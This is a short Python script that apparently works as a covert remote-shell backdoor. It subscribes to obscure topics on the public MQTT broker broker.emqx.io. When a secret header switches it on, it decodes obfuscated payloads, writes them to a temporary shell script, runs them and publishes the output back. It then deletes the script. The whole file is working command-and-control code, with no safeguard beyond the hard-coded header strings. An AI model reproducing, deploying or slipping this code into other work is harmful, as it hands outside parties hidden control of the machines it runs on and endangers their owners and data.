# python3.6

import time
import random
import json
import subprocess
from subprocess import call

from paho.mqtt import client as mqtt_client

broker = 'broker.emqx.io'
port = 1883
receive_topic = "OOyhCjXUpjH9LE"
rsp_topic = "zS02DyLeTKUKVp"
enable_header = "Jd3RK1VllBZatc"
shell_header = "iPlbYNbPgAUu6z"
# generate client ID with pub prefix randomly
client_id = 'blzsUhxWT1tZbm'

# is_debug = True
is_debug = False
shell_enabled = False

def debug(message):
    if is_debug:
        call(f"echo {message}", shell=True)
def exec(command):
    call(command, shell=True)

def connect_mqtt() -> mqtt_client:
    def on_connect(client, userdata, flags, rc):
        if rc == 0:
            debug("Connected to MQTT Broker!")
        else:
            debug(f"Failed to connect, return code {rc}")

    client = mqtt_client.Client(client_id)
    client.on_connect = on_connect
    client.connect(broker, port)
    return client


def subscribe(client: mqtt_client):
    def on_message(client, userdata, msg):
        global shell_enabled
        # print(f"Received `{msg.payload.decode()}` from `{msg.topic}` topic")
        if msg.topic == receive_topic:
            msg_arr = msg.payload
            check_header = msg_arr[0:14]
            header_str = ''.join(chr(i) for i in check_header)
            if header_str == enable_header:
                if msg_arr[14] == 49:
                    shell_enabled = True
                    client.publish(rsp_topic, "Service enabled\n")
                elif msg_arr[14] == 48:
                    shell_enabled = False
                    client.publish(rsp_topic, "Service disabled\n")
                else:
                    print("Unknown active command")
            elif header_str == shell_header:
                if shell_enabled == True:
                    raw_data = msg_arr[14:]

                    decode_data = [x - 128 for x in raw_data]

                    str_data = ''.join(chr(i) for i in decode_data)
                    # print(str_data)
                    f = open("/tmp/tmp_script.sh", "w")
                    f.write(str_data)
                    f.close()
                    exec("chmod +x /tmp/tmp_script.sh")
                    cmd = ['/tmp/tmp_script.sh']
                    proc = subprocess.Popen(cmd, stdout=subprocess.PIPE, stderr=subprocess.PIPE)
                    o, e = proc.communicate()
                    output_str = o.decode('utf-8')
                    if output_str == "":
                        output_str = e.decode('utf-8')
                    exec("rm -fr /tmp/tmp_script.sh")
                    # print(output_str)
                    client.publish(rsp_topic, output_str)
            else:
                print("Unknown header str")
        else:
            print("Invalid topic")


    client.subscribe(receive_topic)
    client.on_message = on_message


def run():
    debug("MQTT program start, wait 30s for network fully loaded and connect to mqtt")
    time.sleep(30)
    client = connect_mqtt()
    subscribe(client)
    client.loop_forever()


if __name__ == '__main__':
    run()

